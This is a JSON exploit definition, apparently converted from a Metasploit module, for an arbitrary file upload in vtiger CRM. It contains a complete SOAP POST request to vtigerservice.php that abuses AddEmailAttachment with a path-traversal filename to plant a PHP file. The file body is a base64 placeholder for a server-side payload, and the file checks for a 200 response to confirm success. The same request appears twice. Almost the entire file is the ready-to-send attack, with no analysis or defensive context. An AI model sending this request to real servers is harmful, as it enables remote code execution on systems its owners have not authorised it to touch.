MSFExploits/outlook/MSF/VtigerSoapUpload.json

{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "name" : "VtigerSoapUpload",
   "platform" : "MULTI",
   "detection" : {},
   "informations" : {
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "TEXT" : "Sending Exploit #1 Request : [POST] /vtigerservice.php",
            "HEADERS" : {
               "Content-Type" : "text/xml; charset=UTF-8"
            },
            "PAYLOAD" : "<soapenv:Envelope xmlns:crm='http://www.vtiger.com/products/crm' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><crm:AddEmailAttachment soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><emailid xsi:type='xsd:string'>Dfhnqu</emailid><filedata xsi:type='xsd:string'>PD9waHAgX19QQVlMT0FEX18gPz4=</filedata><filename xsi:type='xsd:string'>../../../../../../SnINEaR.php</filename><filesize xsi:type='xsd:string'>20</filesize><filetype xsi:type='xsd:string'>php</filetype><username xsi:type='xsd:string'>jzCqmxp</username><session xsi:type='xsd:string'/></crm:AddEmailAttachment></soapenv:Body></soapenv:Envelope>",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "vtigerservice.php",
            "METHOD" : "POST"
         }
      },
      "name" : "VtigerSoapUpload"
   },
   "requests" : {
      "EXPLOIT1" : {
         "TEXT" : "Sending Exploit #1 Request : [POST] /vtigerservice.php",
         "HEADERS" : {
            "Content-Type" : "text/xml; charset=UTF-8"
         },
         "PAYLOAD" : "<soapenv:Envelope xmlns:crm='http://www.vtiger.com/products/crm' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><crm:AddEmailAttachment soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><emailid xsi:type='xsd:string'>Dfhnqu</emailid><filedata xsi:type='xsd:string'>PD9waHAgX19QQVlMT0FEX18gPz4=</filedata><filename xsi:type='xsd:string'>../../../../../../SnINEaR.php</filename><filesize xsi:type='xsd:string'>20</filesize><filetype xsi:type='xsd:string'>php</filetype><username xsi:type='xsd:string'>jzCqmxp</username><session xsi:type='xsd:string'/></crm:AddEmailAttachment></soapenv:Body></soapenv:Envelope>",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "vtigerservice.php",
         "METHOD" : "POST"
      }
   }
}
